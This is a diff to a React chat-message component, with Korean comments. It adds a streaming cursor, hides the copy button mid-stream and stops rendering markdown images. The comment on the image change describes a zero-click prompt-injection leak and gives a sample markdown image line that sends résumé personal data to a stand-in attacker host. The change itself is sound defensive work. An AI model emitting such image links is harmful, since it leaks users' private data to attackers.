@@ -12,6 +12,8 @@ interface MessageBubbleProps {
   agentName?: string;
   isSystem?: boolean;
   timestamp?: number;
+  /** 스트리밍 중 — 커서를 표시하고 복사 버튼을 감춥니다 */
+  streaming?: boolean;
 }
 
 /* ── react-markdown 커스텀 컴포넌트 (Tailwind 스타일링) ── */
@@ -48,6 +50,20 @@ const mdComponents: Components = {
   /* ── 인라인 서식 ── */
   strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
   em: ({ children }) => <em className="italic">{children}</em>,
+
+  /**
+   * ── 이미지: 렌더링하지 않음 ──
+   * 모델 출력에 마크다운 이미지가 있으면 브라우저가 **자동으로** 그 URL을 요청합니다
+   * (React 19는 `<link rel=preload as=image>`까지 붙여 페인트 전에 발사합니다).
+   * 클릭이 필요 없으므로, 프롬프트 인젝션에 성공한 공격자가
+   * `![](https://공격자/?d=<이력서PII>)` 한 줄로 **무클릭 유출**을 만들 수 있습니다.
+   *
+   * 이 앱의 어시스턴트는 이미지를 보여줄 이유가 전혀 없으므로 통째로 막고
+   * alt 텍스트만 남깁니다. CSP의 img-src와 함께 이중으로 방어합니다.
+   */
+  img: ({ alt }) => (
+    <span className="text-text-secondary/50 italic">{alt ? `[${alt}]` : null}</span>
+  ),
 
   /* ── 링크 (XSS 검증 적용) ── */
   a: ({ href, children }) => {
@@ -124,6 +140,7 @@ function MessageBubble({
   agentName,
   isSystem,
   timestamp,
+  streaming,
 }: MessageBubbleProps) {
   const [copied, setCopied] = useState(false);
 
@@ -200,7 +217,16 @@ function MessageBubble({
             {isUser ? (
               <p className="text-sm leading-relaxed whitespace-pre-wrap">{content}</p>
             ) : (
-              <ReactMarkdown remarkPlugins={[remarkGfm]} components={mdComponents}>{content}</ReactMarkdown>
+              <>
+                <ReactMarkdown remarkPlugins={[remarkGfm]} components={mdComponents}>{content}</ReactMarkdown>
+                {/* 스트리밍 커서 — 응답이 살아 있다는 신호 */}
+                {streaming && (
+                  <span
+                    aria-hidden
+                    className="ml-0.5 inline-block h-3.5 w-[2px] translate-y-[2px] animate-pulse bg-accent"
+                  />
+                )}
+              </>
             )}
           </div>
         </div>
@@ -210,17 +236,20 @@ function MessageBubble({
           {time && (
             <span className="text-[10px] text-text-secondary/40">{time}</span>
           )}
-          <button
-            onClick={handleCopy}
-            className="md:opacity-0 md:group-hover:opacity-100 md:focus:opacity-100 transition-opacity rounded p-0.5 text-text-secondary/40 hover:text-text-secondary"
-            aria-label="Copy message"
-          >
-            {copied ? (
-              <Check className="h-3 w-3 text-accent" />
-            ) : (
-              <Copy className="h-3 w-3" />
-            )}
-          </button>
+          {/* 스트리밍 중에는 불완전한 텍스트를 복사하지 않도록 감춥니다 */}
+          {!streaming && (
+            <button
+              onClick={handleCopy}
+              className="md:opacity-0 md:group-hover:opacity-100 md:focus:opacity-100 transition-opacity rounded p-0.5 text-text-secondary/40 hover:text-text-secondary"
+              aria-label="Copy message"
+            >
+              {copied ? (
+                <Check className="h-3 w-3 text-accent" />
+              ) : (
+                <Copy className="h-3 w-3" />
+              )}
+            </button>
+          )}
         </div>
       </div>
     </div>
